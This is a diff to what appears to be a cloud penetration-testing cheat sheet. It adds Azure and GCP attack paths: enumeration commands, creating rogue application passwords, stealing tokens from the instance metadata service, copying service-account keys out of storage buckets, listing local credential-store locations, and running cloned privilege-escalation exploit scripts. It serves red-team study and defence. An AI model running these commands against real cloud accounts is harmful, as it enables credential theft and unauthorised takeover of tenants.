@@ -129,17 +129,209 @@ $ python3 prowler.py aws -R arn:aws:iam::accountID:role/roleName
 
 ### Azure
 
-```bash
-export AZURE_CLIENT_ID = <app-id>
-export AZURE_TENANT_ID = <tenant-id>
-export AZURE_CLIENT_SECRET = <app-secret>
+```powershell
+# Microsoft Graph API Endpoint 
+{HTTP method} https://graph.microsoft.com/{version}/{resource}?{query-parameters}
+
+# Azure Resource Manager API Endpoint
+{HTTP method} https://management.azure.com/{version}/{resource}?{query-parameters} 
+
+# Office 365 Management Access
+# O365 / M365 Admin Center [Web Portal]
+https://admin.microsoft.com
+https://portal.microsoft.com
+
+# O365 / M365 User Portal
+https://office.com/
+
+# O365 API : [management, outlook and other applications]
+{HTTP method} https://*.office.com/{version}/{resource}?{query-parameters}
+
+# Azure Portal URL
+https://portal.azure.com/
+
+# Authentication 
+PS> az login
+PS> az login --service-principal -u <ApplicationID> -p <Password> --tenant <TenantID>
+PS> Connect-AzAccount
+PS> $cred = Get-Credential # [User=Application ID & Password=ClientSecret]
+PS> Connect-AzAccount -ServicePrincipal -Tenant TentantID -Credential $cred
+# Authentication using Access Token
+PS> az account get-access-token --resource=https://management.azure.com 
+PS> Connect-AzAccount -AccessToken <AADAccessToken>
+
+# Authentication using Username + Password
+PS> Connect-MgGraph -Scopes "Directory.Read.All"
+
+# Enumeration
+# Check if target organization is using Entra ID as a IDP [Identity Provider] 
+https://login.microsoftonline.com/getuserrealm.srf?login=Username@DomainName&xml=1
+# Get currently logged-in session information 
+PS> Get-MgContext
+# Get a list of all directory roles
+PS> Get-MgDirectoryRole | ConvertTo-Json 
+# Get a list of members of a directory roles
+PS> Get-MgDirectoryRoleMember -DirectoryRoleId [Directory RoleID] -All | 
+ConvertTo-Json
+# Get a lists of users in Entra ID
+PS> Get-MgUser
+# Get a list of group, specified member part of 
+PS> Get-MgUserMemberOf -UserId [UserID]
+# Get a lists of all groups in Entra ID
+PS> Get-MgGroup 
+# Get a list of members of a group 
+PS> Get-MgGroupMember -GroupId [GroupID] | ConvertTo-Json
+# Get the list of all applications.
+PS> Get-MgApplication 
+# Get the details about a specific applications
+PS> Get-MgApplication -ApplicationId [ApplicationObjectID] | ConvertTo-Json
+# Get the detail about owner of the specified applications
+PS> Get-MgApplicationOwner -ApplicationId [ApplicationObjectID] | ConvertTo-Json
+# Get the details about application permission for an application
+PS> $app= Get-MgApplication -ApplicationId [ApplicationObjectID]
+PS> $app.RequiredResourceAccess
+# Get the details of App Role for Microsoft Graph API
+PS> $res=Get-MgServicePrincipal -Filter "DisplayName eq 'Microsoft Graph'"
+PS> $res.AppRoles | Where-Object {$_.ID -eq 'AppRoleID’} | ConvertTo-Json
+# Get the details about delegation permission for an application
+PS> $app= Get-MgApplication -ApplicationId [ApplicationObjectID]
+PS> $app.Oauth2RequirePostResponse | ConvertTo-Json
+# Get details about currently logged in session 
+PS> az account show
+# Get the list of all available subscriptions
+PS> az account list --all 
+# Get the details of a subscription 
+PS> az account show -s Subscription-ID/Name 
+# Get the list of available resource group in current subscription
+PS> az group list -s Subscription-ID/Name
+# Get the list of available resource group in a specified subscription 
+PS> az group list -s Subscription-ID/Name
+# Get the list of available resources in a current subscription
+PS> az resource list 
+# Get the list of available resources in a specified resource group 
+PS> az resource list --resource-group ResourceGroupName
+# Lists of roles assigned in specified subscription. 
+PS> az role assignment list --subscription Subscription-ID/Name 
+# Lists of roles assigned in current subscription and inherited 
+PS> az role assignment list -all
+# List of all roles assigned to an identity [user, service principal, identity] 
+PS> az role assignment list --assignee ObjectID/Sign-InEmail/ServicePrincipal --all
+# Lists of roles with assigned permission
+PS> az role definition list 
+# Get the full information about a specified role 
+PS> az role definition list -n RoleName 
+# Lists of custom role with assigned permissions 
+PS> az role definition list --custom-role-only 
+
+# Login to Az CLI with Initial Compromised User Credential 
+PS> az login 
+PS> az account list
+
+# Login to Mg Graph Powershell CLI with Initial Compromised User Credential 
+PS> Connect-MgGraph -Scopes "Directory.Read.All"
+PS> Get-MgContext
+# Login to Mg Graph Powershell CLI with access token
+PS> az account get-access-token --resource https://graph.microsoft.com
+PS> Connect-MgGraph -AccessToken [TOKEN]
+# Get the User ID of “auditor” user 
+PS> Get-MgUser -Filter "startswith(displayName,'auditor')"
+# List of all objects owned by logged-in user
+PS> Get-MgUserOwnedObject -UserId [UserID] | ConvertTo-Json
+# Get an application object id & app id 
+PS> Get-MgApplication -Filter "startswith(displayName,'prod-app')"
+# Get a list of all application in Entra ID Tenant 
+PS> Get-MgApplicationOwner -ApplicationId "AppObjectID" | ConvertTo-Json
+# As an app owner, create an application credential. 
+PS> Add-MgApplicationPassword -ApplicationId "AppObjectID" | ConvertTo-Json
+# Check the directory role assigned to prod application.
+PS> Get-MgDirectoryRolememberasServicePrincipal -DirectoryRoleId 
+664f8b57-19df-4893-91f2-6657c3d27b5c | ConvertTo-json
+
+# Get all the role assignment “auditor” user have on azure subscription 
+PS> az role assignment list --assignee 'auditor@atomic-nuclear.site' --all
+# Enumerate VM Instance and it’s public ip address 
+PS> az vm list
+PS> az vm list-ip-addresses --name prod-vm --resource-group PROD-RG
+# Exploit public facing application and retrieve access token of managed identity attached to vm
+PS> curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+# Configure access token in az powershell cli 
+PS> $token = “AccessToken”
+PS> Connect-AzAccount -AccessToken $token -AccountId [Subscription ID]
+# Now Check Again, role assignment of managed identity attached to vm 
+PS> Get-AzRoleAssignment -ObjectId [PrincipalID-ManagedIdentity]
 ```
-
-
 
 ### GCP
 
+```powershell
+# Authentication
+PS> gcloud auth login
+# Get the information about authenticated accounts with gcloud
+PS> gcloud auth list 
+# Login with Service Account
+PS> gcloud auth activate-service-account --key-file KeyFile
+# Stored Credentials on Windows
+PS> ls C:\Users\UserName\AppData\Roaming\gcloud\
+# Stored Credentials on Linux
+$ ls /home/UserName/.config/gcloud/
+# Content of Stored Google Cloud CLI Secrets 
+Database : access_tokens.db : 
+ Table: access_tokens 
+ Columns : account_id, access_token, token_expiry, rapt_token 
+Database : credentials.db : 
+ Table: credentials 
+ Columns: account_id, value
+
+# Enumeration
+PS> gcloud auth list 
+PS> gcloud config list
+PS> gcloud organizations list
+PS> gcloud organizations get-iam-policy [OrganizationID]
+PS> gcloud projects list
+PS> gcloud projects get-iam-policy [ProjectID]
+PS> gcloud iam service-accounts list 
+PS> gcloud iam service-accounts get-iam-policy [Service Account Email ID]
+PS> gcloud iam service-accounts keys list --iam-account [service Account Email ID]
+PS> gcloud iam roles list
+PS> gcloud iam roles describe [roles/owner]
+PS> gcloud iam roles list --project [alert-nimbus-335411]
+PS> gcloud iam roles describe [RoleName] --project [alert-nimbus-335411]
+
+# Automated Enumeration
+$ git clone https://gitlab.com/gitlab-com/gl-security/threatmanagement/redteam/redteam-public/gcp_enum
+$ ./gcp_enum.sh
+
+# Configure Initial Compromised Service Account Credential
+PS> gcloud auth activate-service-account --key-file 
+PS> alert-nimbus-335411-4ee19bc40a65.json
+# Enumerate Cloud Services, e.g IAM, VM, Storage etc. in an Organization Google Cloud Account
+PS> gcloud projects get-iam-policy alert-nimbus-335411 
+PS> gcloud projects get-iam-policy alert-nimbus-335411 --flatten="bindings[].members" --filter="bindings.members=serviceaccount:auditor@alert-nimbus-335411.iam.gserviceaccount.com" --format="value(bindings.role)"
+PS> gcloud compute instances list
+# Exploit Public Facing Application Running on VM and Retrieve Access Token
+PS> curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/233003792018-compute@developer.gserviceaccount.com/token
+# Save the access token in text file & Validate it by retrieving projects information.
+PS> gcloud projects list --access-token-file token.txt
+# Get the IAM Policy for service aoccunt which is attached to compute instance
+PS> gcloud projects get-iam-policy alert-nimbus-335411
+PS> gcloud projects get-iam-policy alert-nimbus-335411 --flatten="bindings[].members" --filter="bindings.members=serviceaccount:233003792018-compute@developer.gserviceaccount.com" --format="value(bindings.role)"
+# Exfiltrate the credential stored in gcp cloud storage using compute default service account credential 
+PS> gcloud storage ls --access-token-file token.txt
+PS> gcloud storage ls gs://devops-storage-metatech --access-token-file token.txt
+PS> gcloud storage cp gs://devops-storage-metatech/devops-srvacc-key.json . --access-token-file token.txt
+# Again, authenticate to gcloud cli with new sa key and retrieve it’s iam policy 
+PS> gcloud auth activate-service-account --key-file devops-srvacc-key.json
+PS> gcloud projects get-iam-policy alert-nimbus-335411 --flatten="bindings[].members" --filter="bindings.members=serviceaccount:devops-service-account@alert-nimbus-335411.iam.gserviceaccount.com" --format="value(bindings.role)"
+```
+
+##### Automated PrivEsc Tool
+
 ```bash
-export GOOGLE_APPLICATION_CREDENTIALS = <Service Account Json File Path>
+$ git clone https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation
+# Identity possible privilege escalation ways in gcp project
+$ python3 PrivEscScanner/enumerate_member_permissions.py -p alert-nimbus-335411
+$ python3 PrivEscScanner/check_for_privesc.py
+# Exploit identified misconfigured iam permission for privilege escalation
+$ python3 ExploitScripts/iam.roles.update.py
 ```
 
